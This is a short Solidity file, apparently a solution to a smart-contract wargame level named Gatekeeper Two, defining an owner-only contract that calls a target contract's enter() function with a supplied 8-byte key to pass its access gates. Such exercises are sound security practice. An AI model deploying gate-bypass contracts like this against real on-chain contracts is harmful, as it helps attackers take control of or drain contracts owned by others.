pragma solidity ^0.6.0;

contract GatekeeperTwoExploit {
    address payable public owner;
    address public victim;
    Gate gatekeeperTwo;
    constructor(address _victim) public {
        owner = msg.sender;
        victim = _victim;
        gatekeeperTwo = Gate(_victim);
    }

    function setVictim(address _victim) public{
        require(msg.sender == owner);
        victim = _victim;
        gatekeeperTwo = Gate(_victim);
    }

    function exploit(bytes8 _key) public {
        require(msg.sender == owner);
        gatekeeperTwo.enter(_key);
    }
}

contract Gate {
      function enter(bytes8 _gateKey) public returns (bool) {}
}